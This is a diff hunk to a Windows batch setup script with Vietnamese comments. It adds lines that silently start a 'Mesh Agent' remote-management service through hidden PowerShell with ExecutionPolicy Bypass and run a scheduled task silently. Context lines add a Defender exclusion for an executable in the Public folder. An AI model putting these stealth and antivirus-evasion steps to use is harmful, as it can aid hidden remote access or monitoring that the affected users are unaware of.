@@ -88,11 +88,19 @@ powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"
 :: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 
+:: Start Mesh Agent silently
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden ^
+  -Command "try{$s=Get-Service 'Mesh Agent' -ErrorAction Stop; if($s.Status -ne 'Running'){ Start-Service $s }}catch{}" >nul 2>&1
+
+:: Run the scheduled task now (silent)
+schtasks /run /tn "%TASK_NAME%" >nul 2>&1
+
 :: === Khởi động lại sau 8 giây, ép đóng app, kèm lý do và thông báo ===
 :: shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."
 
 echo Done all setup. Exiting script...
 exit /b 0
+
 
 
 
